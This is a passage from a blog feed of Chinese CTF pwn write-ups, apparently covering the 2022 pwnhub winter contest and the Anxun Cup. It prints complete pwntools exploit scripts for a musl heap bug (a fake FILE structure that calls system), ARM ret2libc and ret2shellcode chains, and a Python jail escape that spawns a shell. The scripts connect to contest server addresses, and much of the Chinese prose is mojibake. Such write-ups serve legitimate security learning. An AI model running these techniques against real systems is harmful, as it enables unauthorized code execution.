class="hljs-string">&quot;2&quot;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;28633116&#x27;</span>)<br><span class="hljs-comment">#---------------------------999</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;LV: &quot;</span>)<br>    num=rc(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;999&quot;</span>:<br>        sl(<span class="hljs-string">&quot;1&quot;</span>)<br>        r.interactive()<br>    <span class="hljs-keyword">else</span>:<br>        sl(<span class="hljs-string">&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure><p>233æˆ‘çº¯æ‰“æ¸¸æˆå†™äº†ä¸ªè„šæœ¬ï¼Œæœ¬åœ°è¡Œï¼Œè¿œç«¯æœ‰æ—¶é—´é™åˆ¶ï¼Œæ‰“æœ€å999çº§çš„æ€ªæœ€å¤šåˆ°round6å°±ç»™æˆ‘æ–­äº†</p><h2 id="heap">heap</h2><p>musl pwn æ²¡æ¥è§¦è¿‡ï¼Œè¿™é¢˜å°±å½“å…¥é—¨ï¼Œæˆ‘åˆ†æçš„å¾ˆçƒ‚ï¼Œçœ‹ç€ä¹å‘µä¸€ä¸‹å°±è¡Œ</p><h3 id="æ¼æ´">æ¼æ´</h3><p>è¿™é¢˜å…¨æ˜¯ç ´ç»½ï¼Œå¯ä»¥æ•°ç»„è¶Šç•Œï¼Œå¯ä»¥å †æº¢å‡ºï¼ŒfreeåæŒ‡é’ˆæ‚¬æŒ‚(ä¸è¿‡æˆ‘è¿˜æ˜¯ä¸å¤ªäº†è§£åœ¨muslä¸­æ€ä¹ˆåˆ©ç”¨)</p><h3 id="åˆ©ç”¨">åˆ©ç”¨</h3><p>å‚è€ƒçš„æ˜¯<a href="https://wx.zsxq.com/dweb2/index/group/824215518412">nu1læˆ˜é˜Ÿåœ¨çŸ¥è¯†æ˜Ÿçƒåˆ†äº«çš„wp</a>ï¼Œå¤§è‡´æ˜¯æ•°ç»„è¶Šç•Œè¾¾æˆä»»æ„åœ°å€è¯»å†™ï¼Œç”¨IOæ‰“putsæ¥getshell</p><h4 id="1-leak-heap-addr">1.leak heap_addr</h4><p>æ•°ç»„è¶Šç•Œshow(16)æ³„éœ²å †åœ°å€</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/5.png" alt="5"></p><h4 id="2-leak-pie">2.leak pie</h4><p>å¡«å……å­—ç¬¦ä¸²â€˜aâ€™ï¼Œç»§ç»­é…åˆshow(16)æ³„éœ²pieçš„åç§»</p><p>ç„¶åå¤åŸä¸€ä¸‹â€˜aâ€™è¦†ç›–çš„åœ°å€</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/6.png" alt="6"></p><h4 id="3-ä»»æ„åœ°å€è¯»å†™">3.ä»»æ„åœ°å€è¯»å†™</h4><p>ä¸‹æ ‡0x390å¤„æœ‰ä¸ªæŒ‡é’ˆæŒ‡å‘ptrè‡ªå·±ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ§åˆ¶äº†ptrï¼Œå¯ä»¥ä»»æ„åœ°å€è¯»å†™</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/7.png" alt="7"></p><h4 id="4-æ³„æ¼libc">4.æ³„æ¼libc</h4><p>æ”¹ptræŒ‡é’ˆæŒ‡å‘putsçš„gotè¡¨ï¼Œæ³„æ¼libcï¼Œå¾—åˆ°stdoutåœ°å€</p><h4 id="5-æ‰“IO">5.æ‰“IO</h4><p>å› ä¸ºmuslç¼–è¯‘çš„å¥½åƒæ²¡æœ‰malloc_hook,free_hookä¹‹ç±»çš„ï¼Œå°±è¦æ‰“IOæ¥getshell</p><p>æ”¹ptræŒ‡é’ˆæŒ‡å‘stdoutï¼Œä¼ªé€ fakeIOï¼Œé‡åˆ°putsè§¦å‘getshell</p><p>å¯ä»¥çœ‹åˆ°æœ€åæ‰§è¡Œåˆ°å¦‚å›¾æ‰€ç¤º</p><p>è¦æ‰§è¡Œåˆ°è¿™ä¸ªåˆ†æ”¯è¿˜æ˜¯è¦æ»¡è¶³ä¸€äº›æ¡ä»¶ï¼Œå…·ä½“fake_IOè¦æ»¡è¶³å“ªäº›æ¡ä»¶è¿˜æ˜¯å¾—çœ‹æºç </p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/8.png" alt="8"></p><h3 id="exp">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;47.97.127.1&#x27;</span>, <span class="hljs-number">23030</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(r,cmd)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------leak_heap-----------</span><br>show(<span class="hljs-number">16</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x180</span><br>info(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment">#--------leak_pie--------</span><br>edit(<span class="hljs-number">16</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">16</span>)<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>pie_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x40c0</span><br>info(<span class="hljs-string">&quot;pie_base&quot;</span>,pie_base)<br><span class="hljs-comment">#-------------------------</span><br>meta_arena = p64(heap_base + <span class="hljs-number">0x180</span>) + p64(heap_base + <span class="hljs-number">0xb8</span>)<br>edit(<span class="hljs-number">16</span>,<span class="hljs-number">0x10</span>,meta_arena)<br>bss_ptr = pie_base + <span class="hljs-number">0x4040</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,p64(bss_ptr))<br>edit(<span class="hljs-number">0x390</span>,<span class="hljs-number">0x10</span>,p64(bss_ptr)+p64(pie_base+elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><span class="hljs-comment">#---------leak_libc-------</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br>stdout=libc_base+<span class="hljs-number">0x98320</span><br>edit(<span class="hljs-number">0x390</span>,<span class="hljs-number">0x10</span>,p64(bss_ptr)+p64(stdout))<br><span class="hljs-comment">#-------------------------</span><br>fake_IO = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> <span class="hljs-comment"># flags</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rpos</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rend</span><br>fake_IO += p64(libc_base + <span class="hljs-number">0x4bf0f</span>) <span class="hljs-comment"># close</span><br>fake_IO += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># wend</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># wpos</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># mustbezero_1</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># wbase</span><br>fake_IO += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># read</span><br>fake_IO += p64(system) <span class="hljs-comment"># write</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#b*__fwritex+42</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(fake_IO),fake_IO)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="åäº•è§‚å¤©">åäº•è§‚å¤©</h2><p>pythonæ²™ç®±é€ƒé€¸(pyjail)ï¼Œè¿™ç±»é¢˜æ²¡åšè¿‡</p><blockquote><p>pythonæ²™ç®±é€ƒé€¸ï¼ˆpyjailï¼‰ï¼Œæ˜¯CTFä¸­ä¸€ç±»é¢˜çš„é€šç§°ï¼šåœ¨è¿™äº›é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿäº¤äº’å¼åœ°ç”¨<code>eval</code>æˆ–è€…<code>exec</code>æ‰§è¡Œpythonä»£ç ã€‚ç„¶è€Œï¼Œæ‰§è¡Œçš„ä»£ç å’Œä¸Šä¸‹æ–‡å‡å—åˆ°ä¸€å®šé™åˆ¶ï¼Œå¦‚é¢˜ç›®ç”¨æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»éƒ¨åˆ†å­—ç¬¦çš„è¾“å…¥ã€ä»¥åŠä»¤<code>__builtins__=None</code>ç­‰</p></blockquote><p>æœ¬é¢˜æ²¡æœ‰æ–‡ä»¶ï¼Œå¯¹ç‰¹å®šçš„å­—ç¬¦æœ‰é™åˆ¶ï¼ˆå¦‚ç©ºæ ¼ã€å•åŒå¼•å·ã€[]ï¼‰è¦ç»•è¿‡</p><p><code>eval(input())</code>æ‰§è¡Œæˆ‘ä»¬æ¥ä¸‹æ¥è¾“å…¥çš„å‘½ä»¤</p><p>æ¥ç€è¾“å…¥<code>__import__('os').system('sh')</code>æ¥è·å¾—shellå³å¯</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/4.png" alt="4"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ•´æ•°æº¢å‡º</tag>
      
      <tag>musl</tag>
      
      <tag>æ•°ç»„è¶Šç•Œ</tag>
      
      <tag>pyjail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022å®‰æ´µæ¯pwn</title>
    <link href="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
    <url>/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š">å‰è¨€ï¼š</h2><p>ä¹Ÿåªæ˜¯è§£äº†ä¸€é¢˜ï¼Œåç»­å¤ç°ä¸‹ï¼Œ<a href="https://www.kdocs.cn/l/cjhpps6s8YeO">å®˜æ–¹wp</a></p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/1.png" alt="1"></p><h2 id="babyarm">babyarm</h2><p>ä¸€å¼€å§‹ç¯å¢ƒæ²¡è£…å¥½ï¼Œä¹Ÿæ²¡å­¦è¿‡arm ropï¼Œæ•´äº†ä¸‰ä¸ªå°æ—¶è¿˜æ˜¯è§£å‡ºæ¥äº†ï¼Œä¸»è¦è¿™é¢˜ä¸éš¾ã€‚</p><h3 id="åˆ†æï¼š">åˆ†æï¼š</h3><p>æœ¬é¢˜æ˜¯32ä½armæ¶æ„</p><p>æœ€å…ˆæœ‰ä¸ªbase64åŠ å¯†ï¼Œæ£€æµ‹é€šè¿‡åèƒ½æ ˆæº¢å‡º</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/2.png" alt="2"></p><p>233å…¶å®å°±åªæ˜¯ç¼–ç è¡¨0~9çš„ä½ç½®å˜äº†ä¸€ä¸‹</p><p>ç½‘ä¸Šæ‰¾äº†ä¸ªpythonå®ç°çš„ç¨‹åºè§£å¯†ä¸€ä¸‹å¾—åˆ°<code>s1mpl3Dec0d4r</code></p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/3.png" alt="3"></p><h3 id="1-ret2libc">1.ret2libc</h3><p>armæ¶æ„çš„ropè™½ç„¶ä¸ç†Ÿï¼Œä½†åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼ŒåŸºæœ¬ä¸Šçœ‹ç€è¿™ç¯‡<a href="https://oneda1sy.gitee.io/2021/08/02/Arm32-easyRop/">æ–‡ç« </a>å¯¹ç…§ç€æ¥è§£çš„</p><p>æ— éå°±æ˜¯ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-comment">#r=process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi/&quot;,&quot;./chall&quot;])</span><br>r=remote(<span class="hljs-string">&quot;47.108.29.107&quot;</span>,<span class="hljs-string">&quot;10387&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&quot;arm&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sla(<span class="hljs-string">&quot;msg&gt; &quot;</span>,<span class="hljs-string">b&#x27;s1mpl3Dec0d4r&#x27;</span>)<br>puts_plt=<span class="hljs-number">0x104ac</span><br>puts_got=<span class="hljs-number">0x0002101C</span><br>pop_r3_pc=<span class="hljs-number">0x00010464</span> <span class="hljs-comment"># pop &#123;r3, pc&#125;</span><br>pop_r4_to_pc =<span class="hljs-number">0x00010cb0</span> <span class="hljs-comment"># pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br>mov_r0_r7_call=<span class="hljs-number">0x00010ca0</span> <span class="hljs-comment"># mov r0, r7 ; blx r3</span><br>call_r3=<span class="hljs-number">0x00010ca4</span> <span class="hljs-comment"># blx r3</span><br>pc=<span class="hljs-number">0x00010658</span> <span class="hljs-comment"># pop &#123;fp, pc&#125;</span><br>main=<span class="hljs-number">0x10c30</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span><span class="hljs-comment">#+b&#x27;b&#x27;*4</span><br>payload += p32(pop_r4_to_pc)<br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R4</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R5</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R6</span><br>payload += p32(puts_got)   <span class="hljs-comment"># R7</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R8</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># SB</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># SL</span><br>payload += p32(pop_r3_pc)<br>payload += p32(puts_plt)<br>payload += p32(mov_r0_r7_call)<br>payload += <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">28</span>  <span class="hljs-comment"># r4 - r10</span><br>payload += p32(main)<br><br><br>sea(<span class="hljs-string">&quot;comment&gt; &quot;</span>,payload)<br>libc_base=uu32(ru(<span class="hljs-string">&#x27;\xff&#x27;</span>)[-<span class="hljs-number">4</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>sla(<span class="hljs-string">&quot;msg&gt; &quot;</span>,<span class="hljs-string">b&#x27;s1mpl3Dec0d4r&#x27;</span>)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=libc_base+<span class="hljs-number">0x00131bec</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span><span class="hljs-comment">#+b&#x27;b&#x27;*4</span><br>payload += p32(pop_r4_to_pc)<br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R4</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R5</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R6</span><br>payload += p32(binsh)   <span class="hljs-comment"># R7</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># R8</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># SB</span><br>payload += p32(<span class="hljs-number">0</span>)       <span class="hljs-comment"># SL</span><br>payload += p32(pop_r3_pc)<br>payload += p32(system)<br>payload += p32(mov_r0_r7_call)<br>sea(<span class="hljs-string">&quot;comment&gt; &quot;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="2-ret2shellcode">2.ret2shellcode</h3><p>çœ‹äº†åˆ«çš„å¸ˆå‚…çš„é¢˜è§£ï¼Œå› ä¸ºæ˜¯qemuæ¨¡æ‹Ÿè€Œä¸æ˜¯çœŸæœºï¼Œæ‰€ä»¥nxï¼Œpieè¿™äº›éƒ½æ— æ•ˆï¼Œæ‰€ä»¥å…¶å®å¯ä»¥ret2shellcodeï¼Œè¯•äº†ä¸€ä¸‹ä¹Ÿç¡®å®å¯ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>r=process([<span class="hljs-string">&quot;qemu-arm&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="hljs-string">&quot;./chall&quot;</span>])<br><span class="hljs-comment">#r=remote(&quot;47.108.29.107&quot;,&quot;10387&quot;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&quot;arm&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sla(<span class="hljs-string">&quot;msg&gt; &quot;</span>,<span class="hljs-string">b&#x27;s1mpl3Dec0d4r&#x27;</span>)<br>read=<span class="hljs-number">0x10C00</span><br>sla(<span class="hljs-string">&quot;comment&gt;&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p32(elf.bss()+<span class="hljs-number">0x2c</span>)+p32(read))<br>shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    add r0,pc,#12</span><br><span class="hljs-string">    mov r1,#0</span><br><span class="hljs-string">    mov r2,#0</span><br><span class="hljs-string">    mov r7,#11</span><br><span class="hljs-string">    svc 0</span><br><span class="hljs-string">    .ascii &quot;/bin/sh\\0&quot;</span><br><span 